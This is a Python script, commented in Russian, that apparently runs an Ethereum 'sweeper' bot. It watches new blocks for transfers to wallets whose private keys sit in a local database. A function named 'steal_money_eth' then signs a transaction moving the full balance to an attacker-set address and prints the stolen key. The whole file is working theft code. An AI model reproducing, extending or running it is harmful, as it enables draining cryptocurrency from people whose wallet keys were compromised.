from collections import Counter
import database as db
from web3 import Web3
import time
from config import send_address, gwei_eth, eth_grab

eth_vhod = "https://eth-rpc.gateway.pokt.network"
web3 = Web3(Web3.HTTPProvider(eth_vhod))
blocks_eth = []

def start_vivod():
    """Говно код)"""
    getblocks_eth()
    
    
def getblocks_eth():
    """Получение блоков"""
    while True:
        latestBlock = web3.eth.get_block(block_identifier = web3.eth.defaultBlock, full_transactions = True)
        if str(latestBlock.number) in blocks_eth:
            pass
        else:
            trans_eth = latestBlock.transactions
            print(f'Last Block! {str(latestBlock.number)} | ETH')
            trans_wallets_eth(trans_eth)
            blocks_eth.append(str(latestBlock.number))
        time.sleep(0.3)
        
def trans_wallets_eth(trans_eth):
    """В транзах получаем to и сплитаем по ентеру хуле"""
    for x in trans_eth:
        try:
            to_address_split = x['to']
            to_address = to_address_split.split('\n')
            for address in to_address:
                res = db.search_vivod(address)
                if res == False:
                    pass
                else:
                    steal_money_eth(address)
        except:
            pass
        
def steal_money_eth(address):
    """ВЫВОД"""
    try:
        balance = web3.eth.get_balance(address)
        temp_gas = float(gwei_eth)/100
        temp_gas2 = balance*temp_gas
        temp_balance = web3.fromWei(temp_gas2, 'ether')
        temp = float(temp_balance)/0.000021
        wallet_key = db.get_info_address(address)
        grab_from_eth_balance = web3.toWei(eth_grab, 'ether')
        fast_gas_price = web3.toWei(temp, 'gwei')
        counter = 0
        while True:
            if balance < grab_from_eth_balance:
                counter = counter + 1 
                if counter == 200:
                    return
                time.sleep(0.1)
            else:
                break
        nonce = web3.eth.get_transaction_count(address)
        gas = int(fast_gas_price) * 21000
        amount = balance - gas
        tx_price = {
            'chainId': 1,
            'nonce': nonce,
            'to': send_address,
            'value': amount,
            'gas': 21000,
            'gasPrice': int(fast_gas_price)
        }
        signed_tx = web3.eth.account.sign_transaction(tx_price, wallet_key)
        tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
        hash_xd = web3.toHex(tx_hash)
        amount_ether = web3.fromWei(amount, "ether")
        print(f'ETH | УСПЕШНЫЙ ВЫВОД | ХЕШ: {hash_xd} | СУММА: {amount_ether} | АДРЕС: {address} | ПРИВАТ: {wallet_key}')
    except Exception as e:
        print(f'ETH | НЕУСПЕШНЫЙ ВЫВОД | АДРЕС: {address} | ПРИВАТ КЕЙ: {wallet_key} | ОШИБКА: {e}')